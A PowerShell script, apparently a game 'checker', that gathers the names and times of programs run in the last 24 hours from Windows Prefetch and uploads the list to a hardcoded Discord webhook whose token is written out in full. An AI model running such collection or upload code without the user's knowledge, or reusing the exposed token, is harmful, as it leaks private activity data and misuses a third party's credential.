# checker.ps1

$prefetchPath = "$env:SystemRoot\Prefetch"
$dumpPath = "C:\Temp\Dump"
$logFile = "$dumpPath\PrefetchLast24h.txt"
$webhookUrl = "https://discord.com/api/webhooks/1400518810921996318/GPMDV5fgPB6s7W2ZYU03q0DxO4zWx5dYKrgnYOg7JomlpuSwIfn9T9IwrlpPzXto6BfZ"

# Создаем папку для отчета
New-Item -Path $dumpPath -ItemType Directory -Force | Out-Null

# Получаем файлы за последние 24 часа
$since = (Get-Date).AddDays(-1)
$files = Get-ChildItem -Path $prefetchPath -Filter *.pf | Where-Object { $_.LastWriteTime -ge $since }

if ($files.Count -eq 0) {
    "За последние 24 часа файлов Prefetch не найдено." | Out-File $logFile -Encoding utf8
} else {
    $files | ForEach-Object {
        $exeName = $_.Name -replace "-[A-F0-9]{8}\.pf$",""
        "{0,-40} {1}" -f $exeName, $_.LastWriteTime
    } | Out-File $logFile -Encoding utf8
}

# Формируем тело запроса с файлом вложением
$boundary = [System.Guid]::NewGuid().ToString()
$LF = "`r`n"

# Читаем содержимое файла в байты
$fileBytes = [System.IO.File]::ReadAllBytes($logFile)

$bodyLines = @(
    "--$boundary"
    'Content-Disposition: form-data; name="file"; filename="PrefetchLast24h.txt"'
    'Content-Type: text/plain'
    ''
)

# Добавляем содержимое файла (будем добавлять бинарно, ниже)
$bodyEnd = @(
    ''
    "--$boundary--"
    ''
)

# Создаем MemoryStream для всего тела запроса
$ms = New-Object System.IO.MemoryStream
$sw = New-Object System.IO.StreamWriter($ms, [System.Text.Encoding]::ASCII)

# Пишем заголовки и тело
foreach ($line in $bodyLines) {
    $sw.Write($line + $LF)
}
$sw.Flush()

# Записываем бинарные данные файла
$ms.Write($fileBytes, 0, $fileBytes.Length)

# Пишем завершающие строки
foreach ($line in $bodyEnd) {
    $sw.Write($line + $LF)
}
$sw.Flush()

# Возвращаем поток в начало
$ms.Position = 0

# Отправляем запрос
Invoke-WebRequest -Uri $webhookUrl -Method Post -Body $ms -ContentType "multipart/form-data; boundary=$boundary"

# Закрываем поток
$sw.Dispose()
$ms.Dispose()
